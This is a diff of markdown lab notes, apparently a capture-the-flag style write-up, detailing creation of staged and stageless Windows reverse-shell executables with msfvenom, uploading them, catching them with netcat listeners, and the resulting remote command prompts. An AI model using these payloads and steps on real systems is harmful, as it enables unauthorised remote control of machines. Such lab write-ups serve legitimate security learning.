@@ -886,39 +886,58 @@ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.248.19
 [+] Sending stage (200774 bytes) to 10.10.70.179
 [+] Meterpreter session 1 opened (10.10.248.19:1234 -> 10.10.70.179:50335) at 2024-01-11 17:35:22 +0000
 ```
-* Create both staged and stageless meterpreter shells for either target.
-* Upload and manually activate them, catching the shell with netcat -- does this work?
-* Create stageless meterpreter shell for Windows target:
-* Create the msfvenom payload:
-* msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell2.exe LHOST=10.10.18.162 LPORT=1234
-* Upload shell2.exe to target server:
-* Browse to http://10.10.70.179 in attacker’s browser
-* Click ‘Browse’ button
-* Navigate to /root/shell2.exe
-* Click ‘Open’ to select the file
-* Click ‘Submit’ to upload the file
-* Create nc listener on attacking machine: nc -lvnp 1234
-* Execute the shell
-* RDP to the target
-* Open a browser on the target
-* Browse to http://127.0.0.1/uploads
-* Save shell2.exe
-* Run file
-* Session is established:
-* Create staged meterpreter shell for Windows target:
-* Create the msfvenom payload:
-* msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell3.exe LHOST=10.10.18.162 LPORT=1234
-* Upload shell3.exe to target server:
-* Browse to http://10.10.70.179 in attacker’s browser
-* Click ‘Browse’ button
-* Navigate to /root/shell2.exe
-* Click ‘Open’ to select the file
-* Click ‘Submit’ to upload the file
-* Create nc listener on attacking machine: nc -lvnp 1234
-* Execute the shell
-* RDP to the target
-* Open a browser on the target
-* Browse to http://127.0.0.1/uploads
-* Save shell3.exe
-* Run file
-* Session established:
+> Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?
+1. Create stageless meterpreter shell for Windows target.
+ 1. Create the msfvenom payload.
+```
+msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell2.exe LHOST=10.10.18.162 LPORT=1234
+```
+ 2. Upload `shell2.exe` to target.
+  1. Browse to http://10.10.70.179 in attacker’s browser
+  2. Click ‘Browse’ button
+  3. Navigate to /root/shell2.exe
+  4. Click ‘Open’ to select the file
+  5. Click ‘Submit’ to upload the file
+ 3. Create nc listener on attacking machine.
+```
+nc -lvnp 1234
+```
+ 4. Execute the shell.
+  1. RDP to the target.
+  2. Open a browser.
+  3. Browse to `http://127.0.0.1/uploads`.
+  4. Save `shell2`.exe.
+  5. Run file.
+ 5. Session is established.
+```
+Connection from 10.10.70.179 50849 received!
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\Downloads>
+```
+ 2. Create staged meterpreter shell for Windows target.
+  1. Create the msfvenom payload.
+```
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell3.exe LHOST=10.10.18.162 LPORT=1234
+```
+  2. Upload `shell3.exe` to target server.
+   1. Browse to `http://10.10.70.179` in attacker’s browser
+   2. Click ‘Browse’ button
+   3. Navigate to `/root/shell2.exe`.
+   4. Click ‘Open’ to select the file
+   5. Click ‘Submit’ to upload the file
+  3. Create nc listener on attacking machine.
+```
+nc -lvnp 1234
+```
+  4. Execute the shell.
+   1. RDP to the target.
+   2. Open a browser.
+   3. Browse to `http://127.0.0.1/uploads`.
+   4. Save `shell3.exe`.
+   5. Run file.
+  5. Session established.
+```
+connection from 10.10.70.179 51018 received!
+```
